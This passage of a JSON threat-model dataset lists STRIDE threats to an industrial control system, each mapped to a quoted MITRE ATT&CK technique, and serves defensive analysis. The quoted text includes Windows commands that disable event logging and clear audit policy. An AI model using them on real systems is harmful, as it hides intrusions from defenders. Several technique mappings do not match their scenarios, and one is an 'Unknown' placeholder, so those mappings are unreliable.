Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting SCADA vulnerabilities to access and control field devices.",
            "Assumptions": [
                {
                    "Assumption": "The SCADA system has unpatched vulnerabilities.",
                    "Role": "SCADA System",
                    "Condition": "Known security flaws remain unaddressed."
                },
                {
                    "Assumption": "The attacker has access to the SCADA network.",
                    "Role": "Attacker",
                    "Condition": "Network access enabling SCADA interaction."
                },
                {
                    "Assumption": "Insufficient segmentation and security controls within the SCADA environment.",
                    "Role": "Network Security",
                    "Condition": "Weak internal network defenses."
                }
            ],
            "Potential Impact": "Unauthorized control over field devices, potential for physical sabotage, and disruption of critical manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "SCADA Vulnerability Exploitation",
                "Field Device Control",
                "Network Segmentation Bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as an authorized control center operator to issue fraudulent commands to the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to network credentials or an unprotected device with valid credentials.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The control center does not use multi-factor authentication (MFA) for user access.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The RTUs accept commands without validating the source.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Unauthorized control of industrial processes, potential system damage or failures.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Network",
                "User Impersonation",
                "Command Injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker falsifies the identity of field devices to inject fake sensor data into the SCADA system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised a field device or has the means to simulate one.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The SCADA system does not have strong verification for device identities.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Network traffic from field devices to the SCADA system is not encrypted.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Data integrity issues, incorrect operational decisions leading to potential hazards.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Device Impersonation",
                "Sensor Data Injection",
                "Remote System"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A compromised gateway falsifies its identity to cloud services to intercept and alter data.",
            "Assumptions": [
                {
                    "Assumption": "Gateway does not have a robust authentication mechanism with cloud services.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker has gained unauthorized access to the gateway.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Data transmissions between gateway and cloud services are not end-to-end encrypted.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Data confidentiality breach, potential data loss or manipulation, and operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Gateway Compromise",
                "Data Interception",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on a PLC via a direct network connection.",
            "Assumptions": [
                {
                    "Assumption": "PLCs are accessible via a network that is not adequately segmented or protected.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "PLCs do not have robust firmware integrity checks.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker has gained network access, potentially exploiting weak or default credentials on the PLC.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Loss of control over industrial processes, potential safety hazards, and operational downtime.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware Modification",
                "Network Access",
                "Device Control"
            ],
            "mitre_technique": {
                "name": "Modify Control Logic",
                "description": "Adversaries may place malicious code in a system, which can cause the system to malfunction by modifying its control logic. Control system devices use programming languages (e.g. relay ladder logic) to control physical processes by affecting actuators, which cause machines to operate, based on environment sensor readings. These devices often include the ability to perform remote control logic updates. \n\nProgram code is normally edited in a vendor-specific Integrated Development Environment (IDE) that relies on proprietary tools and features. These IDEs allow an engineer to perform host target development and may have the ability to run the code on the machine it is programmed for. The IDE will transmit the control logic to the testing device, and will perform the required device-specific functions to apply the changes and make them active.\n\nAn adversary may attempt to use this host target IDE to modify device control logic. Even though proprietary tools are often used to edit and update control logic, the process can usually be reverse-engineered and reproduced with open-source tools.\n\nAn adversary can de-calibrate a sensor by removing functions in control logic that account for sensor error. This can be used to change a control process without actually spoofing command messages to a controller or device. \n\nIt is believed this process happened in the lesser known over-pressurizer attacks build into Stuxnet. Pressure sensors are not perfect at translating pressure into an analog output signal, but their errors can be corrected by calibration. The pressure controller can be told what the \u201creal\u201d pressure is for given analog signals and then automatically linearize the measurement to what would be the \u201creal\u201d pressure. If the linearization is overwritten by malicious code on the S7-417 controller, analog pressure readings will be \u201ccorrected\u201d during the attack by the pressure controller, which then interprets all analog pressure readings as perfectly normal pressure no matter how high or low their analog values are. The pressure controller then acts accordingly by never opening the stage exhaust valves. In the meantime, actual pressure keeps rising. (Citation: Stuxnet - Langner - 201311)\n\nIn the Maroochy Attack, Vitek Boden gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed by Hunter Watertech for its use in changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. (Citation: Maroochy - MITRE - 200808)",
                "id": "attack-pattern--e0d74479-86d2-465d-bf36-903ebecef43e",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data streams between the gateway and cloud services to distort data analytics results.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels between the gateway and cloud services are not secure.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker can intercept and modify data streams.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The system lacks robust data integrity verification mechanisms.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Data integrity issues, inaccurate analytics and reporting, suboptimal decisions based on tampered data.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Stream Interception",
                "Cloud Communication",
                "Data Integrity"
            ],
            "mitre_technique": {
                "name": "Clear Network Connection History and Configurations",
                "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
                "id": "attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc",
                "technique_id": "T1070.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious software is introduced into the MES database to distort production workflow data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to the MES database through a security vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The database does not have adequate protection against unauthorized modifications.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Internal network security is insufficient to prevent or detect such attacks.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Corrupted or compromised workflow data, potential disruption in production schedules, financial loss.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "MES Compromise",
                "Database Corruption",
                "Internal Network"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An operator performing critical changes within the MES denies having made them due to lack of proper logging.",
            "Assumptions": [
                {
                    "Assumption": "The MES does not implement comprehensive logging of operator actions.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Operators have the ability to execute critical changes without a traceable audit trail.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Audit logs, if they exist, are either tampered with or not secured.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Inability to hold individuals accountable, potential cover-up of malicious insider activities.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Logging",
                "Audit Trail",
                "Operator Actions"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Unauthorized changes to configuration files in the gateway are denied by the attacker due to insufficient log protection.",
            "Assumptions": [
                {
                    "Assumption": "The gateway does not adequately log configuration changes.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker can gain access to and modify configuration files.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Log files are not tamper-proof.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Misconfigured gateway settings, disruption of data flow, and inability to trace the source of the change.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Configuration Changes",
                "Log Tampering",
                "Gateway"
            ],
            "mitre_technique": {
                "name": "Web Shell",
                "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",
                "id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb",
                "technique_id": "T1505.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker executing malicious commands on the HMI denies responsibility due to lack of detailed logging.",
            "Assumptions": [
                {
                    "Assumption": "The HMI does not log specific user actions in detail.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Access controls are not robust enough to prevent unauthorized usage.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Log files can be edited or deleted by attackers.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Difficulty in forensic investigations, inability to identify the perpetrator, increased risk of repeat offenses.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "User Actions",
                "Log Integrity",
                "HMI"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized personnel eavesdrop on unencrypted communications between RTUs and the control center.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels between RTUs and the control center are not encrypted.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker has access to the network through which these communications pass.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "There are no additional mechanisms (like VPNs) protecting this communication.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data, potential for data manipulation or interception.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Unencrypted Communication",
                "Eavesdropping",
                "Network Traffic"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored in the cloud is accessed by malicious actors due to weak encryption algorithms.",
            "Assumptions": [
                {
                    "Assumption": "Data stored in the cloud uses weak or outdated encryption.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "The attacker has the tools and capability to crack weak encryption.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Access controls on sensitive data are not sufficiently stringent.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Compromise of high-value operational data, potential leaks of proprietary information.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Weak Encryption",
                "Cloud Storage",
                "Data Breach"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An employee inadvertently emails sensitive production data to an external, unauthorized recipient.",
            "Assumptions": [
                {
                    "Assumption": "Employees have the ability to send sensitive data via email without restrictions.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "There are no Data Loss Prevention (DLP) mechanisms in place to prevent such occurrences.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Sensitive data is not adequately labeled or protected within the email system.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Disclosure of sensitive operational data to unauthorized parties, possible competitive disadvantage.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Email",
                "Data Loss Prevention",
                "Insider Threat"
            ],
            "mitre_technique": {
                "name": "Email Collection",
                "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",
                "id": "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f",
                "technique_id": "T1114"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the communication channels between the control center and field devices with traffic, disrupting operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has identified the communication channels used by the system.",
                    "Role": "Attacker",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "Network infrastructure does not have sufficient protection against traffic floods.",
                    "Role": "System",
                    "Condition": "Valid"
                },
                {
                    "Assumption": "There are no rate limiting or traffic filtering mechanisms in place.",
                    "Role": "System",
                    "Condition": "Valid"
                }
            ],
            "Potential Impact": "Interference with control commands and data flow, potential operational failures or delays.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Traffic Flood",
                "Network Disruption",
                "Field Devices"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
